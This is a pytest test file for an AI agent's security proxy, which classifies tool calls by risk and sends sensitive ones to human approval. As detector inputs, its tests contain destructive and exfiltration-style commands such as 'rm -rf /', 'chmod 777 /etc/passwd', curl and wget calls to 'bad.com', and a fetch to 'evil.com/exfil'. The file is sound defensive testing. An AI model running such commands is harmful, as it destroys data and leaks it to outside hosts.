"""
Unit tests for the Security Proxy node.

Tests tool call classification, risk assessment, HITL interrupt payload
construction, and approval normalization logic.
"""

import json
import pytest
from unittest.mock import patch, MagicMock
from langchain_core.messages import AIMessage

from src.agent.nodes.security_proxy import (
    security_proxy_node,
    _normalize_approval,
    _tool_calls_from_last_message,
    _is_sensitive_call,
    _risk_meta_for_call,
    SENSITIVE_TOOLS,
)


# ── Helper: build a minimal AgentState ──────────────────────────────────────

def _make_state(messages=None, **extra):
    """Build a dict matching AgentState shape."""
    return {
        "messages": messages or [],
        "execution_approved": None,
        "security_decision": None,
        "security_reason": None,
        "pending_tool_names": None,
        "pending_tool_calls": None,
        **extra,
    }


def _tool_call(name: str, args: dict | None = None, tool_call_id: str = "call_1"):
    return {
        "name": name,
        "args": args or {},
        "id": tool_call_id,
        "type": "tool_call",
    }


# ── _normalize_approval ─────────────────────────────────────────────────────

class TestNormalizeApproval:
    def test_bool_true(self):
        assert _normalize_approval(True) is True

    def test_bool_false(self):
        assert _normalize_approval(False) is False

    def test_string_approve(self):
        assert _normalize_approval("approve") is True
        assert _normalize_approval("approved") is True
        assert _normalize_approval("allow") is True
        assert _normalize_approval("yes") is True
        assert _normalize_approval("y") is True

    def test_string_deny(self):
        assert _normalize_approval("deny") is False
        assert _normalize_approval("no") is False
        assert _normalize_approval("reject") is False
        assert _normalize_approval("") is False

    def test_dict_with_approved_bool(self):
        assert _normalize_approval({"approved": True}) is True
        assert _normalize_approval({"approved": False}) is False

    def test_dict_with_approved_string(self):
        assert _normalize_approval({"approved": "approve"}) is True
        assert _normalize_approval({"approved": "deny"}) is False

    def test_dict_missing_key(self):
        assert _normalize_approval({"other": True}) is False

    def test_none(self):
        assert _normalize_approval(None) is False

    def test_other_types(self):
        assert _normalize_approval(1) is False
        assert _normalize_approval(0) is False
        assert _normalize_approval([]) is False


# ── _tool_calls_from_last_message ───────────────────────────────────────────

class TestToolCallsFromLastMessage:
    def test_no_messages(self):
        state = _make_state()
        assert _tool_calls_from_last_message(state) == []

    def test_empty_messages(self):
        state = _make_state(messages=[])
        assert _tool_calls_from_last_message(state) == []

    def test_last_message_with_tool_calls(self):
        msg = AIMessage(content="", tool_calls=[
            {"name": "read_workspace_file", "args": {"path": "test.txt"}, "id": "call_1", "type": "tool_call"},
        ])
        state = _make_state(messages=[msg])
        calls = _tool_calls_from_last_message(state)
        assert len(calls) == 1
        assert calls[0]["name"] == "read_workspace_file"

    def test_last_message_no_tool_calls(self):
        msg = AIMessage(content="Hello, how can I help?")
        state = _make_state(messages=[msg])
        assert _tool_calls_from_last_message(state) == []

    def test_ignores_earlier_messages(self):
        earlier = AIMessage(content="", tool_calls=[
            {"name": "write_workspace_file", "args": {}, "id": "call_0", "type": "tool_call"},
        ])
        later = AIMessage(content="Just thinking...")
        state = _make_state(messages=[earlier, later])
        assert _tool_calls_from_last_message(state) == []


# ── _is_sensitive_call ─────────────────────────────────────────────────────

class TestIsSensitiveCall:
    def test_sensitive_tool_by_name(self):
        for tool_name in SENSITIVE_TOOLS:
            assert _is_sensitive_call(tool_name, {}) is True

    def test_safe_tool_clean_args(self):
        assert _is_sensitive_call("read_workspace_file", {"path": "/tmp/test.txt"}) is False
        assert _is_sensitive_call("recall_memories", {"query": "What did I do yesterday?"}) is False

    def test_sensitive_pattern_in_args(self):
        assert _is_sensitive_call("run_bash", {"command": "rm -rf /"}) is True
        assert _is_sensitive_call("execute", {"cmd": "sudo rm -rf /etc"}) is True
        assert _is_sensitive_call("run_command", {"script": "chmod 777 /etc/passwd"}) is True
        # ssh in args (not at command start) won't match; the pattern requires \bssh\b but
        # json.dumps wraps it in quotes: '{"host":"example.com","cmd":"ssh ..."}'
        assert _is_sensitive_call("run_command", {"cmd": "ssh user@host whoami"}) is True

    def test_safe_pattern_not_mistaken(self):
        assert _is_sensitive_call("read_file", {"path": "/tmp/curly.txt"}) is False  # "curl" substring no match
        assert _is_sensitive_call("search", {"query": "how to delete a file"}) is False  # "delete" in query text

    def test_args_as_string_matches_shell_style(self):
        # The regex looks for commands at start of string or after [;&|]
        assert _is_sensitive_call("run", "rm -rf /tmp") is True
        assert _is_sensitive_call("run", "; curl http://bad.com") is True
        assert _is_sensitive_call("run", "| wget http://bad.com") is True


# ── _risk_meta_for_call ────────────────────────────────────────────────────

class TestRiskMetaForCall:
    def test_destructive_delete_file(self):
        meta = _risk_meta_for_call("delete_workspace_file", {"path": "/data"})
        assert meta["risk_category"] == "destructive_action"
        assert meta["risk_confidence"] == 0.98

    def test_destructive_pattern(self):
        meta = _risk_meta_for_call("run_command", {"cmd": "rm -rf /tmp/data"})
        assert meta["risk_category"] == "destructive_action"

    def test_network_exfiltration(self):
        meta = _risk_meta_for_call("fetch_url", {"url": "http://evil.com/exfil"})
        assert meta["risk_category"] == "network_exfiltration"
        assert meta["risk_confidence"] == 0.9

    def test_privilege_escalation(self):
        meta = _risk_meta_for_call("run_command", {"cmd": "sudo chmod 777 /etc/passwd"})
        assert meta["risk_category"] == "privilege_escalation"
        assert meta["risk_confidence"] == 0.92

    def test_sensitive_tool_fallback(self):
        meta = _risk_meta_for_call("write_workspace_file", {"path": "/tmp/test.txt", "content": "hello"})
        assert meta["risk_category"] == "sensitive_tool_execution"
        assert meta["risk_confidence"] == 0.8

    def test_remediation_hint_present(self):
        for tool_name in SENSITIVE_TOOLS:
            meta = _risk_meta_for_call(tool_name, {})
            assert "remediation_hint" in meta
            assert meta["remediation_hint"]


# ── security_proxy_node (with mocked interrupt) ────────────────────────────

class TestSecurityProxyNode:
    @patch("src.agent.nodes.security_proxy.interrupt")
    @pytest.mark.asyncio
    async def test_no_tool_calls_returns_denied(self, mock_interrupt):
        """When there are no tool calls, the node returns denied."""
        msg = AIMessage(content="I don't need any tools.")
        state = _make_state(messages=[msg])
        result = await security_proxy_node(state)
        assert result["execution_approved"] is False
        assert result["security_decision"] == "denied"
        assert "No tool call found" in (result.get("security_reason") or "")
        mock_interrupt.assert_not_called()

    @patch("src.agent.nodes.security_proxy.interrupt")
    @pytest.mark.asyncio
    async def test_safe_tool_passes_through(self, mock_interrupt):
        """Safe tool calls are auto-approved without HITL."""
        msg = AIMessage(content="", tool_calls=[
            _tool_call("read_workspace_file", {"path": "/tmp/test.txt"}),
        ])
        state = _make_state(messages=[msg])
        result = await security_proxy_node(state)
        assert result["execution_approved"] is True
        assert result["security_decision"] == "approved"
        mock_interrupt.assert_not_called()

    @patch("src.agent.nodes.security_proxy.interrupt")
    @pytest.mark.asyncio
    async def test_sensitive_tool_triggers_hitl(self, mock_interrupt):
        """Sensitive tool calls trigger HITL interrupt."""
        mock_interrupt.return_value = {"approved": True}
        msg = AIMessage(content="", tool_calls=[
            _tool_call("write_workspace_file", {"path": "/tmp/test.txt", "content": "data"}),
        ])
        state = _make_state(messages=[msg])
        result = await security_proxy_node(state)
        mock_interrupt.assert_called_once()
        call_args = mock_interrupt.call_args[0][0]
        assert call_args["type"] == "security_approval_required"
        assert len(call_args["sensitive_tool_calls"]) == 1
        assert call_args["sensitive_tool_calls"][0]["name"] == "write_workspace_file"
        assert result["execution_approved"] is True
        assert result["security_decision"] == "approved"

    @patch("src.agent.nodes.security_proxy.interrupt")
    @pytest.mark.asyncio
    async def test_sensitive_tool_denied(self, mock_interrupt):
        """Denied sensitive tool produces a polite denial message."""
        mock_interrupt.return_value = {"approved": False}
        msg = AIMessage(content="", tool_calls=[
            _tool_call("delete_workspace_file", {"path": "/tmp/secret.txt"}),
        ])
        state = _make_state(messages=[msg])
        result = await security_proxy_node(state)
        assert result["execution_approved"] is False
        assert result["security_decision"] == "denied"
        assert result["security_reason"] == "Sensitive tool request denied by human reviewer."
        assert len(result["messages"]) == 1
        denied_msg = result["messages"][0]
        assert "safer alternative" in str(denied_msg.content)

    @patch("src.agent.nodes.security_proxy.interrupt")
    @pytest.mark.asyncio
    async def test_mixed_safe_and_sensitive(self, mock_interrupt):
        """Mixed calls: safe ones listed alongside sensitive in interrupt."""
        mock_interrupt.return_value = {"approved": True}
        msg = AIMessage(content="", tool_calls=[
            _tool_call("read_workspace_file", {"path": "/tmp/test.txt"}),
            _tool_call("write_workspace_file", {"path": "/tmp/out.txt", "content": "data"}),
        ])
        state = _make_state(messages=[msg])
        result = await security_proxy_node(state)
        mock_interrupt.assert_called_once()
        call_args = mock_interrupt.call_args[0][0]
        assert len(call_args["sensitive_tool_calls"]) == 1
        assert call_args["sensitive_tool_calls"][0]["name"] == "write_workspace_file"
        assert len(call_args["safe_tool_calls"]) == 1
        assert call_args["safe_tool_calls"][0]["name"] == "read_workspace_file"
        assert result["execution_approved"] is True

    @patch("src.agent.nodes.security_proxy.interrupt")
    @pytest.mark.asyncio
    async def test_interrupt_payload_contains_risk_metadata(self, mock_interrupt):
        """HITL interrupt payload includes risk metadata for each sensitive call."""
        mock_interrupt.return_value = {"approved": False}
        msg = AIMessage(content="", tool_calls=[
            _tool_call("delete_workspace_file", {"path": "/data"}),
        ])
        state = _make_state(messages=[msg])
        await security_proxy_node(state)
        call_args = mock_interrupt.call_args[0][0]
        sensitive = call_args["sensitive_tool_calls"][0]
        assert "risk_category" in sensitive
        assert "risk_confidence" in sensitive
        assert "risk_rationale" in sensitive
        assert "remediation_hint" in sensitive
        assert sensitive["risk_category"] == "destructive_action"

    @patch("src.agent.nodes.security_proxy.interrupt")
    @pytest.mark.asyncio
    async def test_approval_payload_passes_tool_names(self, mock_interrupt):
        """On approval, pending_tool_names contains all tool names."""
        mock_interrupt.return_value = {"approved": True}
        msg = AIMessage(content="", tool_calls=[
            _tool_call("write_workspace_file", {"path": "/tmp/test.txt", "content": "data"}),
        ])
        state = _make_state(messages=[msg])
        result = await security_proxy_node(state)
        assert result["pending_tool_names"] == ["write_workspace_file"]

    @patch("src.agent.nodes.security_proxy.interrupt")
    @pytest.mark.asyncio
    async def test_notebook_run_is_sensitive(self, mock_interrupt):
        """notebook_run is in the sensitive tool allowlist."""
        mock_interrupt.return_value = {"approved": False}
        msg = AIMessage(content="", tool_calls=[
            _tool_call("notebook_run", {"code": "print('hello')"}),
        ])
        state = _make_state(messages=[msg])
        await security_proxy_node(state)
        mock_interrupt.assert_called_once()

    @patch("src.agent.nodes.security_proxy.interrupt")
    @pytest.mark.asyncio
    async def test_edit_workspace_file_is_sensitive(self, mock_interrupt):
        """edit_workspace_file is in the sensitive tool allowlist."""
        mock_interrupt.return_value = {"approved": True}
        msg = AIMessage(content="", tool_calls=[
            _tool_call("edit_workspace_file", {"path": "/tmp/test.txt", "old_string": "foo", "new_string": "bar"}),
        ])
        state = _make_state(messages=[msg])
        result = await security_proxy_node(state)
        mock_interrupt.assert_called_once()
        assert result["execution_approved"] is True
